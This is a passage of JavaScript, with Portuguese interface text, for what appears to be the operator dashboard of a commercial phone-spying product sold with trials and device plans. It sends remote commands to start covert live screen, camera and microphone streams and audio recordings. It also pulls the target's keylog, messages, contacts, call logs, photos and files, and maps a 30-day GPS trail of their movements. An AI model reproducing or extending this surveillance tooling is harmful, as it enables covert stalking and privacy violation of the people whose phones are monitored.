        sendCommand('START_AUDIO_STREAM');
        isAudioStreaming = true;
        const icon = document.getElementById('btn-audio-live-icon');
        const txt  = document.getElementById('btn-audio-live-txt');
        if (icon) icon.className = 'fa-solid fa-headphones fa-beat';
        if (txt)  txt.textContent = '⏹ Parar Áudio Live';
        const badge = document.getElementById('cam-audio-badge');
        if (badge) badge.style.display = 'inline-block';
    }
}

// Handle Device List updates
function updateDeviceList(devices) {
    // Merge: update existing entries, add new ones — never delete (keeps offline devices visible)
    devices.forEach(d => {
        const existing = devicesMap.get(d.deviceId);
        if (existing) {
            // Preserve locally-known telemetry if server sends defaults
            devicesMap.set(d.deviceId, { ...existing, ...d });
        } else {
            devicesMap.set(d.deviceId, d);
        }
    });

    renderDeviceList();

    // Update status bar if selected device is in this list
    if (currentDeviceId) {
        const dev = devicesMap.get(currentDeviceId);
        if (dev) updateActiveDeviceUI(dev);
    }

    // Auto select first device if none is selected
    if (devices.length > 0 && !currentDeviceId) {
        selectDevice(devices[0].deviceId);
    }
}

// Render Devices list in sidebar
function renderDeviceList() {
    const listContainer = document.getElementById('device-list');
    const noDevicesMsg  = document.getElementById('no-devices');
    listContainer.innerHTML = '';

    if (devicesMap.size === 0) { noDevicesMsg.style.display = 'block'; return; }
    noDevicesMsg.style.display = 'none';

    // Update slot counter header
    const activeCount = [...devicesMap.values()].filter(d => d.isActive).length;
    let slotEl = document.getElementById('device-slot-info');
    if (!slotEl) {
        slotEl = document.createElement('div');
        slotEl.id = 'device-slot-info';
        slotEl.style.cssText = 'padding:8px 16px 6px;font-size:11px;color:var(--text-muted,#8E94A5);border-bottom:1px solid rgba(255,255,255,0.05);display:flex;align-items:center;gap:6px';
        listContainer.parentElement.insertBefore(slotEl, listContainer);
    }
    slotEl.innerHTML = `<span style="color:${activeCount >= planMaxDevices ? '#FF9900' : '#39FF14'}">●</span> ${activeCount} de ${planMaxDevices} aparelho(s) ativo(s)`;

    const nowMs = Date.now();
    const TRIAL_MS = 7 * 24 * 60 * 60 * 1000;

    devicesMap.forEach(device => {
        const id  = device.deviceId;
        const isSelected = id === currentDeviceId;

        // Compute trial state
        let statusBadge = '';
        let rowClass = '';
        if (device.isActive) {
            statusBadge = '<span class="dev-badge dev-badge-active">Ativo</span>';
        } else if (device.trialStartedAt) {
            const elapsed = nowMs - device.trialStartedAt;
            const daysLeft = Math.max(0, Math.ceil((TRIAL_MS - elapsed) / 86400000));
            if (elapsed > TRIAL_MS) {
                statusBadge = '<span class="dev-badge dev-badge-expired">Expirado</span>';
                rowClass = 'device-expired';
            } else {
                statusBadge = `<span class="dev-badge dev-badge-trial">Teste: ${daysLeft}d</span>`;
                rowClass = daysLeft <= 2 ? 'device-trial-warning' : 'device-trial';
            }
        } else {
            statusBadge = '<span class="dev-badge dev-badge-trial">Inativo</span>';
            rowClass = 'device-trial';
        }

        const activateBtn = !device.isActive
            ? `<button class="dev-action-btn dev-activate-btn" title="Ativar aparelho"
                 onclick="event.stopPropagation();activateDevice('${escapeHtml(id)}')">Ativar</button>`
            : '';

        const li = document.createElement('li');
        li.className = `device-item ${isSelected ? 'active' : ''} ${rowClass}`;
        li.onclick = () => selectDevice(id);
        li.innerHTML = `
            <div class="device-info-left" style="min-width:0;flex:1">
                <span class="device-item-name">${escapeHtml(String(device.displayName || device.model || ''))}</span>
                <span class="device-item-model">${escapeHtml(String(device.model || ''))}</span>
                ${statusBadge}
            </div>
            <div class="device-actions-col">
                ${activateBtn}
                <button class="dev-action-btn dev-delete-btn" title="Excluir aparelho"
                  onclick="event.stopPropagation();confirmDeleteDevice('${escapeHtml(id)}')">🗑</button>
                <div class="device-status-dot ${device.isOnline ? 'online' : 'offline'}"></div>
            </div>`;
        listContainer.appendChild(li);
    });
}

// ── Device Management Actions ─────────────────────────────────────────────────

function confirmDeleteDevice(deviceId) {
    const dev = devicesMap.get(deviceId);
    const name = escapeHtml(String(dev?.displayName || dev?.model || deviceId));
    if (!confirm(`Excluir o aparelho "${name}"?\n\nO monitoramento deste dispositivo será encerrado permanentemente.`)) return;
    deleteDevice(deviceId);
}

async function deleteDevice(deviceId) {
    try {
        const res = await fetch(`/api/devices/${encodeURIComponent(deviceId)}`, {
            method: 'DELETE',
            headers: { Authorization: `Bearer ${getToken()}` }
        });
        if (!res.ok) {
            const j = await res.json().catch(() => ({}));
            alert('Erro ao excluir: ' + (j.error || res.status));
            return;
        }
        devicesMap.delete(deviceId);
        if (currentDeviceId === deviceId) {
            currentDeviceId = null;
            const first = devicesMap.keys().next().value;
            if (first) selectDevice(first);
        }
        renderDeviceList();
    } catch (e) { alert('Erro de rede: ' + e.message); }
}

async function activateDevice(deviceId) {
    const activeCount = [...devicesMap.values()].filter(d => d.isActive).length;
    if (activeCount >= planMaxDevices) {
        // Need to swap — show selection dialog
        const activeDevices = [...devicesMap.values()].filter(d => d.isActive && d.deviceId !== deviceId);
        if (activeDevices.length === 0) { alert('Nenhum aparelho ativo para trocar.'); return; }

        const options = activeDevices.map(d =>
            `${escapeHtml(String(d.displayName || d.model || d.deviceId))} (${d.isOnline ? '🟢 online' : '🔴 offline'})`
        ).join('\n');
        const choice = prompt(
            `Limite de ${planMaxDevices} aparelho(s) atingido.\n\nEscolha o número do aparelho a DESATIVAR:\n\n` +
            activeDevices.map((d, i) => `${i + 1}. ${d.displayName || d.model || d.deviceId}`).join('\n')
        );
        const idx = parseInt(choice) - 1;
        if (isNaN(idx) || idx < 0 || idx >= activeDevices.length) return;
        await doActivate(deviceId, activeDevices[idx].deviceId);
    } else {
        await doActivate(deviceId, null);
    }
}

async function doActivate(deviceId, swapDeviceId) {
    try {
        const body = swapDeviceId ? { swapDeviceId } : {};
        const res = await fetch(`/api/devices/${encodeURIComponent(deviceId)}/activate`, {
            method: 'POST',
            headers: { Authorization: `Bearer ${getToken()}`, 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        if (!res.ok) {
            const j = await res.json().catch(() => ({}));
            alert('Erro ao ativar: ' + (j.error || res.status));
            return;
        }
        // Server will broadcast updated DEVICE_LIST via WebSocket
        logToConsole('Aparelho ativado com sucesso!', 'success');
    } catch (e) { alert('Erro de rede: ' + e.message); }
}

function checkTrialWarnings() {
    const nowMs = Date.now();
    const TRIAL_MS = 7 * 24 * 60 * 60 * 1000;
    devicesMap.forEach(device => {
        if (!device.isActive && device.trialStartedAt) {
            const elapsed = nowMs - device.trialStartedAt;
            const daysLeft = Math.ceil((TRIAL_MS - elapsed) / 86400000);
            if (elapsed > TRIAL_MS) {
                showToast(`⚠️ Aparelho "${device.displayName || device.model}" está expirado. Ative-o ou será removido em breve.`, 'warning', 8000);
            } else if (daysLeft <= 2) {
                showToast(`⏳ "${device.displayName || device.model}" expira em ${daysLeft} dia(s)! Ative-o para não perder o acesso.`, 'warning', 8000);
            }
        }
    });
}

let _toastQueue = [];
function showToast(msg, type = 'info', duration = 4000) {
    let container = document.getElementById('toast-container');
    if (!container) {
        container = document.createElement('div');
        container.id = 'toast-container';
        container.style.cssText = 'position:fixed;bottom:24px;right:24px;z-index:9999;display:flex;flex-direction:column;gap:8px;max-width:360px';
        document.body.appendChild(container);
    }
    const toast = document.createElement('div');
    const bg = type === 'warning' ? '#FF9900' : type === 'error' ? '#FF3838' : '#00D2FF';
    toast.style.cssText = `background:${bg};color:#000;padding:12px 16px;border-radius:12px;font-size:13px;font-weight:600;line-height:1.4;box-shadow:0 4px 20px rgba(0,0,0,0.4);cursor:pointer;transition:opacity .3s`;
    toast.textContent = msg;
    toast.onclick = () => toast.remove();
    container.appendChild(toast);
    setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 300); }, duration);
}

// Select a device to control
function selectDevice(deviceId) {
    const oldDeviceId = currentDeviceId;
    if (oldDeviceId && oldDeviceId !== deviceId) {
        // Stop any live streams on the device we're leaving — otherwise it keeps
        // streaming to a dashboard that's no longer displaying it.
        if (isScreenStreaming) sendCommandTo(oldDeviceId, 'STOP_SCREEN_STREAM');
        if (isCameraStreaming) sendCommandTo(oldDeviceId, 'STOP_CAMERA_STREAM');
        if (isAudioStreaming) sendCommandTo(oldDeviceId, 'STOP_AUDIO_STREAM');
    }

    currentDeviceId = deviceId;

    renderDeviceList();

    // Reset file browser state — it belongs to the previous device's filesystem
    fbCurrentPath = '';
    fbHistory = [];
    fbPreviewPending = {};
    const fbList = document.getElementById('fb-list');
    if (fbList) { fbList.innerHTML = ''; fbList.style.display = 'none'; }
    const fbEmpty = document.getElementById('fb-empty');
    if (fbEmpty) fbEmpty.style.display = 'flex';
    const fbBreadcrumb = document.getElementById('fb-breadcrumb');
    if (fbBreadcrumb) fbBreadcrumb.textContent = '/';

    // Reset location UI — old device's marker/accuracy shouldn't linger
    if (deviceMarker && map) { map.removeLayer(deviceMarker); deviceMarker = null; }
    const accEl = document.getElementById('location-accuracy');
    if (accEl) accEl.textContent = 'Precisão: --';

    // Reset street history for new device
    recentStreets = [];
    lastGeocodeTime = 0;
    renderStreetHistory();
    startStreetUpdateScheduler();

    const device = devicesMap.get(deviceId);
    if (device) {
        updateActiveDeviceUI(device);
        fetchMediaList(deviceId);
        stopLocalScreenUI();
        stopLocalCameraUI();
        isAudioStreaming = false;
        if (audioCtx) { audioCtx.close(); audioCtx = null; }
        const icon = document.getElementById('btn-audio-live-icon');
        const txt  = document.getElementById('btn-audio-live-txt');
        if (icon) icon.className = 'fa-solid fa-headphones';
        if (txt)  txt.textContent = 'Ouvir Ao Vivo';
        const badge = document.getElementById('cam-audio-badge');
        if (badge) badge.style.display = 'none';
        fetchDeviceHistory(deviceId);

    }

    if (window.innerWidth <= 767) closeSidebar();
}

// Update Top Bar & Status of selected device
function updateActiveDeviceUI(device) {
    document.getElementById('current-device-name').textContent = device.model;
    const badge = document.getElementById('current-device-status');
    
    badge.className = `status-badge ${device.isOnline ? 'online' : 'offline'}`;
    badge.textContent = device.isOnline ? 'ONLINE' : 'OFFLINE';
    
    const telemetry = document.getElementById('device-telemetry');
    if (device.isOnline) {
        telemetry.style.display = 'flex';
        updateBatteryUI(device.battery || 100, device.isCharging || false);
    } else {
        telemetry.style.display = 'none';
    }
}

// Update Battery status
function updateBatteryUI(level, isCharging) {
    const batteryLevel = document.getElementById('battery-level');
    const batteryIcon = document.getElementById('battery-icon');
    
    batteryLevel.textContent = `${level}%`;
    
    // Adjust battery icons
    batteryIcon.className = 'fa-solid ';
    if (isCharging) {
        batteryIcon.className += 'fa-battery-bolt neon-text-blue';
    } else if (level > 85) {
        batteryIcon.className += 'fa-battery-full';
    } else if (level > 60) {
        batteryIcon.className += 'fa-battery-three-quarters';
    } else if (level > 35) {
        batteryIcon.className += 'fa-battery-half';
    } else if (level > 15) {
        batteryIcon.className += 'fa-battery-quarter';
    } else {
        batteryIcon.className += 'fa-battery-empty neon-text-pink fa-shake';
    }
}

// Fetch historical events and locations from Database
function fetchDeviceHistory(deviceId) {
    // 1. Fetch Logs History
    fetch(`/api/device/${deviceId}/logs-history`, { headers: authHeaders() })
        .then(res => res.json())
        .then(logs => {
            if (deviceId !== currentDeviceId) return;
            clearConsole();
            logs.forEach(log => {
                const time = new Date(log.timestamp).toLocaleTimeString('pt-BR');
                const consoleBody = document.getElementById('terminal-body');
                if (consoleBody) {
                    const line = document.createElement('div');
                    line.className = `terminal-line ${log.type}`;
                    line.innerHTML = `<span class="timestamp">[${time}]</span> ${escapeHtml(log.message)}`;
                    consoleBody.appendChild(line);
                }
            });
            const consoleBody = document.getElementById('terminal-body');
            if (consoleBody) consoleBody.scrollTop = consoleBody.scrollHeight;
            logToConsole(`Histórico de logs carregado (${logs.length} eventos).`, 'system');
        })
        .catch(err => console.error('Error fetching logs history:', err));

    // 2. Fetch 30-day Trail
    fetchTrailHistory(deviceId);

    // 3. Fetch Messages History
    waReloadMessages(deviceId);

    // 4. Fetch Contacts
    fetchContacts(deviceId);

    // 5. Fetch Call Logs
    fetchCallLogs(deviceId);

    // 6. Fetch Keylog
    fetchKeylog(deviceId);
}

// Fetch and draw trail for selected days
function fetchTrailHistory(deviceId) {
    if (!deviceId) return;
    const days = document.getElementById('trail-days-select')?.value || 30;

    fetch(`/api/device/${deviceId}/telemetry-history?days=${days}`, { headers: authHeaders() })
        .then(res => res.json())
        .then(points => {
            if (deviceId !== currentDeviceId) return; // stale response from a since-abandoned device switch
            trailHistoryPoints = points; // cache for trail history panel

            // Update trail stats bar (mobile)
            const km = points.length >= 2 ? calcTotalDistance(points).toFixed(1) : '--';
            const kEl = document.getElementById('trail-km');
            const pEl = document.getElementById('trail-pts');
            if (kEl) kEl.textContent = km;
            if (pEl) pEl.textContent = points.length;

            clearTrail();

            if (!map) return;

            if (points.length === 0) {
                document.getElementById('location-accuracy').textContent = 'Precisão: --';
                return;
            }

            logToConsole(`Rastro carregado: ${points.length} pontos (últimos ${days} dias).`, 'system');

            // Group points by calendar day for color-coded segments
            const dayGroups = groupPointsByDay(points);
            const totalDays = dayGroups.length;

            dayGroups.forEach((group, idx) => {
                if (group.coords.length < 2) return;

                const ratio   = totalDays <= 1 ? 1 : idx / (totalDays - 1);
                const color   = interpolateTrailColor(ratio);
                const opacity = 0.3 + ratio * 0.6;
                const weight  = 2 + ratio * 2.5;

                // Leaflet polyline — coords are [lat, lng] arrays
                const latlngs = group.coords.map(c => [c.lat, c.lng]);
                const polyline = L.polyline(latlngs, {
                    color, opacity, weight, smoothFactor: 1.5
                }).addTo(map);
                trailPolylines.push(polyline);

                // Day label marker
                if (idx < totalDays - 1) {
                    const label = new Date(group.day).toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit' });
                    const dayIcon = L.divIcon({
                        className: '',
                        html: `<div class="day-marker-dot" style="background:${color};"><span class="day-marker-label">${label}</span></div>`,
                        iconSize: [36, 18], iconAnchor: [18, 9]
                    });
                    const m = L.marker([group.coords[0].lat, group.coords[0].lng], { icon: dayIcon }).addTo(map);
                    dayMarkers.push(m);
                }
            });

            // Device position marker
            const lastPt = points[points.length - 1];
            document.getElementById('location-accuracy').textContent = `Precisão: ${lastPt.accuracy.toFixed(1)}m`;

            if (deviceMarker)       { map.removeLayer(deviceMarker); }
            if (deviceAccuracyCircle){ map.removeLayer(deviceAccuracyCircle); }

            const devIcon = L.divIcon({
                className: '',
                html: '<div class="device-marker-dot"></div>',
                iconSize: [20, 20], iconAnchor: [10, 10]
            });
            deviceMarker = L.marker([lastPt.lat, lastPt.lng], { icon: devIcon, zIndexOffset: 1000 }).addTo(map);
            deviceMarker.bindPopup('<b>Última localização conhecida</b>');

            deviceAccuracyCircle = L.circle([lastPt.lat, lastPt.lng], {
                radius: lastPt.accuracy,
                color: '#00d2ff', opacity: 0.5, weight: 1.5,
                fillColor: '#00d2ff', fillOpacity: 0.1
            }).addTo(map);

            // Fly to last known position at street-level zoom
            map.flyTo([lastPt.lat, lastPt.lng], 16, { duration: 1.2 });

            // Trigger street name for last known position
            lastGeocodeTime = 0;
            updateStreetHistory(lastPt.lat, lastPt.lng);
        })
        .catch(err => console.error('Error fetching trail:', err));
}

// Group telemetry points by calendar day
function groupPointsByDay(points) {
    const groups = [];
    let currentDay = null;
    let currentGroup = null;

    points.forEach(p => {
        const d = new Date(p.timestamp);
        const dayKey = `${d.getFullYear()}-${d.getMonth()}-${d.getDate()}`;
        if (dayKey !== currentDay) {
            if (currentGroup) groups.push(currentGroup);
            currentDay = dayKey;
            currentGroup = { day: p.timestamp, coords: [] };
        }
        currentGroup.coords.push({ lat: p.lat, lng: p.lng });
    });
    if (currentGroup) groups.push(currentGroup);
    return groups;
}

// Interpolate trail color: 0=oldest (purple/grey), 1=newest (neon cyan)
function interpolateTrailColor(ratio) {
    // oldest: #6b4fa0 (purple)  →  newest: #00d2ff (neon cyan)
    const r = Math.round(107 + (0 - 107) * ratio);
    const g = Math.round(79 + (210 - 79) * ratio);
    const b = Math.round(160 + (255 - 160) * ratio);
    return `rgb(${r},${g},${b})`;
}

// Clear all trail polylines and day markers from map
function clearTrail() {
    if (map) {
        trailPolylines.forEach(p => map.removeLayer(p));
        dayMarkers.forEach(m => map.removeLayer(m));
    }
    trailPolylines = [];
    dayMarkers = [];
}

// Refresh trail when days selector changes
function refreshTrail() {
    if (currentDeviceId) fetchTrailHistory(currentDeviceId);
}

// Handle real-time telemetry details (location, battery)
function handleTelemetry(data) {
    if (data.deviceId !== currentDeviceId) return;

    if (data.battery !== undefined) {
        updateBatteryUI(data.battery, data.isCharging || false);
    }

    if (data.lat && data.lng) {
        const lat      = parseFloat(data.lat);
        const lng      = parseFloat(data.lng);
        const accuracy = parseFloat(data.accuracy) || 10;
        const provider = data.provider || 'gps';

        // Accuracy indicator top bar
        const accEl = document.getElementById('location-accuracy');
        if (accEl) {
            const providerLabel = provider === 'gps' ? '📡 GPS' : provider === 'fused' ? '🔀 Fusão' : '📶 Rede';
            const color = accuracy <= 10 ? '#39ff14' : accuracy <= 50 ? '#ff9900' : '#ff3838';
            accEl.innerHTML = `<span style="color:${color};font-weight:600;">${providerLabel} ±${accuracy.toFixed(0)}m</span>`;
        }

        // Mobile GPS bar
        updateGpsBar(lat, lng, accuracy, Date.now());

        // Add to trail history cache (live point)
        trailHistoryPoints.push({ lat, lng, accuracy, timestamp: Date.now() });
        const kEl = document.getElementById('trail-km');
        const pEl = document.getElementById('trail-pts');
        if (pEl) pEl.textContent = trailHistoryPoints.length;
        if (kEl && trailHistoryPoints.length >= 2) kEl.textContent = calcTotalDistance(trailHistoryPoints).toFixed(1);

        logToConsole(`📍 ${provider.toUpperCase()} ±${accuracy.toFixed(0)}m — ${lat.toFixed(5)}, ${lng.toFixed(5)}`, 'system');

        const pos = { lat, lng };

        // Marker color by accuracy
        const markerColor = accuracy <= 15 ? '#00d2ff' : accuracy <= 50 ? '#ff9900' : '#ff3838';

        if (deviceMarker) {
            // Update existing Leaflet marker and circle
            deviceMarker.setLatLng([lat, lng]);
            const el = deviceMarker.getElement();
            if (el) el.querySelector('.device-marker-dot')?.setAttribute('style', `background:${markerColor};box-shadow:0 0 12px ${markerColor}80;`);
            deviceAccuracyCircle.setLatLng([lat, lng]);
            deviceAccuracyCircle.setRadius(accuracy);
            deviceAccuracyCircle.setStyle({ color: markerColor, fillColor: markerColor });
        } else if (map) {
            const devIcon = L.divIcon({
                className: '',
                html: `<div class="device-marker-dot" style="background:${markerColor};box-shadow:0 0 12px ${markerColor}80;"></div>`,
                iconSize: [20, 20], iconAnchor: [10, 10]
            });
            deviceMarker = L.marker([lat, lng], { icon: devIcon, zIndexOffset: 1000 }).addTo(map);
            deviceMarker.bindPopup('<b>Dispositivo</b>');
            deviceAccuracyCircle = L.circle([lat, lng], {
                radius: accuracy,
                color: markerColor, opacity: 0.5, weight: 1.5,
                fillColor: markerColor, fillOpacity: 0.1
            }).addTo(map);
        }

        // Append to live trail polyline
        if (trailPolylines.length > 0) {
            trailPolylines[trailPolylines.length - 1].addLatLng([lat, lng]);
        } else if (map) {
            trailPolylines.push(
                L.polyline([[lat, lng]], { color: '#00d2ff', opacity: 0.9, weight: 3 }).addTo(map)
            );
        }

        // Follow mode
        if (map && mapFollowMode) {
            map.panTo([lat, lng]);
            if (map.getZoom() < 15) map.setZoom(16);
        }

        // Update street history (throttled to 90s)
        updateStreetHistory(lat, lng);
    }

}

// Fetch photos and audios for the selected device
function fetchMediaList(deviceId) {
    fetch(`/uploads/${deviceId}/media-list`, { headers: authHeaders() })
        .then(res => res.json())
        .then(data => {
            if (deviceId !== currentDeviceId) return; // stale response from a since-abandoned device switch
            renderPhotos(deviceId, data.photos || []);
            renderAudios(deviceId, data.audio || []);
            renderSentAudios(deviceId);
        })
        .catch(err => console.error('Error fetching media list:', err));
}

// Render sent audio commands for current device
function renderSentAudios(deviceId) {
    const list = document.getElementById('audio-sent-list');
    if (!list) return;
    const entries = sentAudioLog.filter(e => e.deviceId === deviceId);
    if (entries.length === 0) {
        list.innerHTML = '<div class="empty-audio-msg">Nenhum comando enviado ainda.</div>';
        return;
    }
    list.innerHTML = '';
    // Show newest first
    [...entries].reverse().forEach(e => appendSentAudio(e, false));
}

function appendSentAudio(entry, prepend = true) {
    const list = document.getElementById('audio-sent-list');
    if (!list) return;
    const empty = list.querySelector('.empty-audio-msg');
    if (empty) empty.remove();

    const time = new Date(entry.ts).toLocaleTimeString('pt-BR') + ' ' + new Date(entry.ts).toLocaleDateString('pt-BR');
    const div = document.createElement('div');
    div.className = 'audio-item audio-sent';
    div.innerHTML = `
        <div class="audio-info">
            <i class="fa-solid fa-paper-plane"></i>
            <div class="audio-meta">
                <span class="audio-name">Comando de Gravação (${entry.duration}s)</span>
                <span class="audio-time">${time}</span>
            </div>
        </div>
        <span class="audio-sent-badge">ENVIADO</span>
    `;
    if (prepend && list.firstChild) list.insertBefore(div, list.firstChild);
    else list.appendChild(div);
}

// Render photo gallery
function renderPhotos(deviceId, photos) {
    const gallery = document.getElementById('photo-gallery');
    gallery.innerHTML = '';

    // Populate global list for modal navigation
    pmPhotos = photos.map(item => {
        const fileName = item.name || item;
        const url      = item.url || `/uploads/${deviceId}/photos/${fileName}`;
        const tsMatch  = fileName.match(/photo_(\d+)\.jpg/);
        let caption    = 'Captura';
        if (tsMatch) {
            const d = new Date(parseInt(tsMatch[1]));
            caption = d.toLocaleTimeString('pt-BR') + ' · ' + d.toLocaleDateString('pt-BR');
        }
        return { url, caption };
    });

    if (pmPhotos.length === 0) {
        gallery.innerHTML = '<div class="empty-gallery-msg">Nenhuma foto capturada ainda.</div>';
        return;
    }

    pmPhotos.forEach((p, idx) => {
        const photoDiv = document.createElement('div');
        photoDiv.className = 'gallery-photo-item';
        photoDiv.onclick = () => openPhotoModal(idx);

        photoDiv.innerHTML = `
            <img src="${escapeHtml(p.url)}" alt="Foto" loading="lazy">
            <span class="photo-timestamp">${escapeHtml(p.caption)}</span>
        `;
        gallery.appendChild(photoDiv);
    });
}

// Render Audio Playlist
let audioBlobUrls = [];
function renderAudios(deviceId, audios) {
    const audioList = document.getElementById('audio-list');
    audioBlobUrls.forEach(u => URL.revokeObjectURL(u));
    audioBlobUrls = [];
    audioList.innerHTML = '';

    if (audios.length === 0) {
        audioList.innerHTML = '<div class="empty-audio-msg">Nenhuma gravação de áudio encontrada.</div>';
        return;
    }

    audios.forEach(item => {
        const fileName = item.name || item;
        const fileUrl = item.url || `/uploads/${deviceId}/audio/${fileName}`;

        const tsMatch = fileName.match(/audio_(\d+)\.aac/);
        let timeStr = 'Gravação';
        if (tsMatch) {
            const date = new Date(parseInt(tsMatch[1]));
            timeStr = date.toLocaleTimeString('pt-BR') + ' ' + date.toLocaleDateString('pt-BR');
        }

        const audioDiv = document.createElement('div');
        audioDiv.className = 'audio-item';

        audioDiv.innerHTML = `
            <div class="audio-info">
                <i class="fa-solid fa-microphone-lines"></i>
                <div class="audio-meta">
                    <span class="audio-name">Áudio Ambiente</span>
                    <span class="audio-time">${timeStr}</span>
                </div>
            </div>
            <div class="audio-player-control">
                <audio controls preload="metadata">
                    <source src="${escapeHtml(fileUrl)}" type="audio/aac">
                    <source src="${escapeHtml(fileUrl)}" type="audio/mp4">
                    <source src="${escapeHtml(fileUrl)}" type="audio/mpeg">
                </audio>
            </div>
        `;

        const audioEl = audioDiv.querySelector('audio');
        audioEl.addEventListener('error', async () => {
            // Fallback: fetch as blob so browser can play from memory (bypasses CORS/redirect issues)
            try {
                const resp = await fetch(fileUrl, { headers: authHeaders() });
                if (resp.ok) {
                    const blob = await resp.blob();
                    const blobUrl = URL.createObjectURL(blob);
                    audioBlobUrls.push(blobUrl);
                    audioEl.src = blobUrl;
                    audioEl.load();
                } else {
                    audioEl.parentElement.innerHTML = `<a href="${escapeHtml(fileUrl)}" target="_blank" download class="audio-download-link"><i class="fa-solid fa-download"></i> Baixar Áudio</a>`;
                }
            } catch {
                audioEl.parentElement.innerHTML = `<a href="${escapeHtml(fileUrl)}" target="_blank" download class="audio-download-link"><i class="fa-solid fa-download"></i> Baixar Áudio</a>`;
            }
        });

        audioList.appendChild(audioDiv);
    });
}

// Send a command to an explicit device without depending on currentDeviceId
// (used when tearing down streams on a device we're navigating away from).
function sendCommandTo(deviceId, command, params = {}) {
    if (!deviceId) return;
    const device = devicesMap.get(deviceId);
    if (device && !device.isOnline) return;
    if (socket && socket.readyState === WebSocket.OPEN) {
        socket.send(JSON.stringify({ command, deviceId, ...params }));
    }
}

// Send Remote Command over WebSocket
function sendCommand(command, params = {}) {
    if (!currentDeviceId) {
        logToConsole('Nenhum dispositivo selecionado!', 'error');
        return;
    }

    const device = devicesMap.get(currentDeviceId);
    if (device && !device.isOnline) {
        logToConsole(`Comando '${command}' falhou: Dispositivo está OFFLINE!`, 'error');
        return;
    }

    const payload = { command, deviceId: currentDeviceId, ...params };

    if (socket && socket.readyState === WebSocket.OPEN) {
        socket.send(JSON.stringify(payload));
        logToConsole(`Comando enviado: ${command} (${JSON.stringify(params)})`, 'command');

        // Track sent audio commands to display in audio panel
        if (command === 'RECORD_AUDIO') {
            const entry = { ts: Date.now(), duration: params.duration || 15, deviceId: currentDeviceId };
            sentAudioLog.push(entry);
            if (currentDeviceId === entry.deviceId) appendSentAudio(entry);
        }
    } else {
        logToConsole('Erro: Sem conexão com o servidor!', 'error');
    }
}

// Toggle Screen Capture Streaming state
function toggleScreenStream() {
    if (!currentDeviceId) { logToConsole('Nenhum dispositivo selecionado!', 'error'); return; }

    if (isScreenStreaming) {
        sendCommand('STOP_SCREEN_STREAM');
        stopLocalScreenUI();
        logToConsole('Transmissão de tela encerrada.', 'system');
    } else {
        sendCommand('START_SCREEN_STREAM');
        isScreenStreaming = true;

        const badge = document.getElementById('screen-stream-badge');
        if (badge) badge.style.display = 'inline-flex';

        const icon = document.getElementById('sc-screen-icon');
        if (icon) icon.className = 'fa-solid fa-stop';

        // Also update command panel button if exists
        const btnText = document.getElementById('screen-btn-text');
        const btnIcon = document.getElementById('screen-btn-icon');
        const btn     = document.getElementById('btn-screen');
        if (btnText) btnText.textContent = 'Parar Tela';
        if (btnIcon) btnIcon.className = 'fa-solid fa-stop-circle fa-beat';
        if (btn) { btn.classList.add('btn-danger'); btn.classList.remove('btn-secondary'); }

        logToConsole('Aguardando transmissão de tela...', 'system');
    }
}

// Stop screen sharing UI locally
function stopLocalScreenUI() {
    isScreenStreaming = false;

    const badge = document.getElementById('screen-stream-badge');
    if (badge) badge.style.display = 'none';

    const img = document.getElementById('screen-stream-img');
    const ph  = document.getElementById('screen-placeholder');
    if (img) { img.src = ''; img.style.display = 'none'; }
    if (ph)  ph.style.display = 'flex';

    const icon = document.getElementById('sc-screen-icon');
    if (icon) icon.className = 'fa-solid fa-play';

    const btnText = document.getElementById('screen-btn-text');
    const btnIcon = document.getElementById('screen-btn-icon');
    const btn     = document.getElementById('btn-screen');
    if (btnText) btnText.textContent = 'Tela ao Vivo';
    if (btnIcon) btnIcon.className = 'fa-solid fa-desktop';
    if (btn) { btn.classList.remove('btn-danger'); btn.classList.add('btn-secondary'); }

    if (currentStreamObjectUrl) { URL.revokeObjectURL(currentStreamObjectUrl); currentStreamObjectUrl = null; }
}

// Log formatting for terminal window
function logToConsole(message, type = 'system') {
    const consoleBody = document.getElementById('terminal-body');
    if (!consoleBody) return;
    
    const time = new Date().toLocaleTimeString('pt-BR');
    
    const line = document.createElement('div');
    line.className = `terminal-line ${type}`;
    line.innerHTML = `<span class="timestamp">[${time}]</span> ${escapeHtml(message)}`;
    
    consoleBody.appendChild(line);
    consoleBody.scrollTop = consoleBody.scrollHeight; // Auto scroll down
}

// Clear Terminal body
function clearConsole() {
    const consoleBody = document.getElementById('terminal-body');
    if (consoleBody) {
        consoleBody.innerHTML = '';
    }
}

// ─── Photo Lightbox Modal ─────────────────────────────────────────────────────

let pmPhotos   = [];   // [{url, caption}]
let pmIndex    = 0;
let pmZoomed   = false;
let pmScale    = 1;
let pmPanX     = 0;
let pmPanY     = 0;

// Touch/swipe state
let pmTouchStartX = 0;
let pmTouchStartY = 0;
let pmTouchDist   = 0;  // for pinch
let pmIsPinching  = false;
let pmIsDragging  = false;

function openImageModal(src, caption) {
    // Find index in current photo list
    const idx = pmPhotos.findIndex(p => p.url === src);
    openPhotoModal(idx >= 0 ? idx : 0);
}

// Called from renderPhotos with full list
function openPhotoModal(index) {
    if (pmPhotos.length === 0) return;
    pmIndex  = Math.max(0, Math.min(index, pmPhotos.length - 1));
    pmZoomed = false;
    pmScale  = 1; pmPanX = 0; pmPanY = 0;

    const modal = document.getElementById('photo-modal');
    modal.classList.add('open');
    document.body.style.overflow = 'hidden';

    pmRender();
    pmBuildThumbs();
    pmAttachGestures();
    pmAttachKeyboard();
}

function closePhotoModal() {
    document.getElementById('photo-modal').classList.remove('open');
    document.body.style.overflow = '';
    pmDetachKeyboard();
    pmResetZoom();
}

function pmRender(slideDir) {
    const img     = document.getElementById('pm-img');
    const caption = document.getElementById('pm-caption');
    const counter = document.getElementById('pm-counter');
    const dl      = document.getElementById('pm-download');
    const p       = pmPhotos[pmIndex];

    // Animate
    img.classList.remove('pm-slide-left', 'pm-slide-right');
    if (slideDir === 1)  { void img.offsetWidth; img.classList.add('pm-slide-left');  }
    if (slideDir === -1) { void img.offsetWidth; img.classList.add('pm-slide-right'); }

    img.src        = p.url;
    caption.textContent = p.caption;
    counter.textContent = `${pmIndex + 1} / ${pmPhotos.length}`;
    dl.href        = p.url;
    dl.download    = p.caption.replace(/[^a-z0-9]/gi, '_') + '.jpg';

    // Nav arrows
    document.getElementById('pm-prev').disabled = pmIndex === 0;
    document.getElementById('pm-next').disabled = pmIndex === pmPhotos.length - 1;

    // Highlight active thumb
    document.querySelectorAll('.pm-thumb').forEach((t, i) => {
        t.classList.toggle('active', i === pmIndex);
    });
    // Scroll thumb into view
